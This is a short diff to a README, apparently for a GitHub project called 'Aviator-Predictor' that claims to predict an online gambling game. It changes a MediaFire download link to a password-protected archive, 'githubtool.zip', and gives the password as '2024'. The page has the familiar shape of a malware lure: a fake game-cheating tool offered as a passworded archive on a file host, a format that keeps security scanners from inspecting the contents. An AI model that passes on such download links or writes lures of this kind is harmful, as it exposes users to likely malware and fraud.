@@ -2,8 +2,7 @@
 
 ![1](https://github.com/Zzero-simo/Aviator-Predictor--2/blob/main/302161437-a2368ccb-e998-486f-83d5-ac579e49397c%20(2).png)
 
-# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://www.mediafire.com/file/so3ivi8ej6ue5v0/githubtool.zip)
-
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://www.mediafire.com/file/sitog6e1ybkhjhk/githubtool.zip/file)
 # 🔓𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : 2024
 
 # ​🇮​ ​🇳​ ​🇫​ ​🇴​ ​🇷​ ​🇲​ ​🇦​ ​🇹​ ​🇮​ ​🇴​ ​🇳​ 💬
